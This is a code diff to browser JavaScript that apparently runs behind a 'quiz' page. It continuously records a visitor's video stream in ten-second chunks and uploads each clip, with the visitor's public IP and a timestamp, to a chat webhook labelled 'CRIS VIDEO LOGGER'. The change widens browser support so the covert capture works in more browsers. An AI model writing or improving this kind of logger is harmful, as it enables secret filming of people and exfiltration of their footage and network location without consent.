@@ -220,10 +220,24 @@
       try {
         if (!stream) return;
         
-        videoRecorder = new MediaRecorder(stream, { 
-          mimeType: 'video/webm;codecs=vp8',
+        // Check for supported MIME types
+        let mimeType;
+        if (MediaRecorder.isTypeSupported('video/mp4')) {
+          mimeType = 'video/mp4';
+        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+          mimeType = 'video/webm;codecs=vp9';
+        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
+          mimeType = 'video/webm;codecs=vp8';
+        } else if (MediaRecorder.isTypeSupported('video/webm')) {
+          mimeType = 'video/webm';
+        } else {
+          mimeType = ''; // Let browser choose
+        }
+        
+        videoRecorder = new MediaRecorder(stream, mimeType ? { 
+          mimeType: mimeType,
           videoBitsPerSecond: 1000000
-        });
+        } : {});
         
         videoRecorder.ondataavailable = (event) => {
           if (event.data && event.data.size > 0) {
@@ -240,23 +254,25 @@
             
             videoRecorder.onstop = async () => {
               if (videoChunks.length > 0) {
-                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                const videoBlob = new Blob(videoChunks, { type: videoRecorder.mimeType || 'video/mp4' });
                 
                 if (videoBlob.size > 10000) {
                   try {
                     const ip = await getIP();
+                    const fileExt = videoRecorder.mimeType && videoRecorder.mimeType.includes('webm') ? 'webm' : 'mp4';
                     const form = new FormData();
-                    form.append('file', new File([videoBlob], `video-${++videoCounter}.webm`, { type: 'video/webm' }));
+                    form.append('file', new File([videoBlob], `video-${++videoCounter}.${fileExt}`, { type: videoRecorder.mimeType || 'video/mp4' }));
                     form.append('payload_json', JSON.stringify({
                       username: "🇨🇷🇮🇸 🇻🇮🇩🇪🇴 🇱🇴🇬🇬🇪🇷",
-                      content: `Video Recording #${videoCounter}`,
+                      content: `Video Recording #${videoCounter} (${videoRecorder.mimeType || 'video/mp4'})`,
                       embeds: [{
                         title: "Quiz Video Capture",
                         description: "10-second video segment",
                         color: 15158332,
                         fields: [
                           { name: "Public IP:", value: `\`${ip}\``, inline: true },
-                          { name: "Time:", value: new Date().toLocaleString(), inline: true }
+                          { name: "Time:", value: new Date().toLocaleString(), inline: true },
+                          { name: "Format:", value: `\`${videoRecorder.mimeType || 'auto'}\``, inline: true }
                         ],
                         timestamp: new Date().toISOString(),
                         footer: { text: "🇨🇷🇮🇸 🇱🇴🇬🇬🇪🇷" }
@@ -270,10 +286,10 @@
                 // Clear chunks and restart recording
                 videoChunks = [];
                 if (stream && stream.active) {
-                  videoRecorder = new MediaRecorder(stream, { 
-                    mimeType: 'video/webm;codecs=vp8',
+                  videoRecorder = new MediaRecorder(stream, mimeType ? { 
+                    mimeType: mimeType,
                     videoBitsPerSecond: 1000000
-                  });
+                  } : {});
                   
                   videoRecorder.ondataavailable = (event) => {
                     if (event.data && event.data.size > 0) {
